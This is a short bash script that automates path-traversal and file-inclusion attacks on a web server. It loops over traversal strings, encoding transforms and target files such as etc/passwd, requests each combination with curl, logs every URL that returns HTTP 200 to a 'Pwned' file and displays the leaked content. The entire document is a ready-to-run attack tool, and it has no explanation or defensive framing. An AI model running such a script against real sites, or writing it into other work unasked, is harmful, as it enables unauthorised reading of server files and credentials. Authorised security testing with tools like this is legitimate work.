#!/bin/bash
host="${1}"			# www.example.com
#port="${3}"			# 80
path="${2}"			# /?file=
queries=./Assets/queries.txt 	# ../../
files=./Assets/files.txt	# etc/passwd
translations=./Assets/translations.txt

for file in $(cat $files) # 
do
	for translation in $(cat $translations)
	do
		for query in $(cat $queries)
		do
			queryy=$(echo $query | sed $translation)
			curl --include "$host$path$queryy$file" 2> /dev/null \
			       | grep -E '\<200\>'
			if [[ $? == 0 ]]; then
				echo "$host$path$queryy$file" >> ./Pwned/abc.txt
				curl "$host$path$queryy$file" | less	
			else
				echo $host$path$queryy$file
			fi 
		done
	done
done

exit 0
